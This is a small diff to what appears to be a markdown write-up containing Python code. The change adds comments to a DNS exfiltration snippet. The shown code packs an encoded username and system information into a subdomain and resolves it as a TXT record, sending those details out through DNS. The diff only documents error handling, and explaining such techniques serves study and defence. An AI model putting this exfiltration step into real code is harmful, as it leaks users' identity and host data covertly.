@@ -150,6 +150,8 @@ encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
 try:
     dns.resolver.resolve(encoded_message, 'TXT')
 except:
+    # pass to ignore errors
+    # -- errors will occur because we're querying non-existent domains
     pass
 ```
 
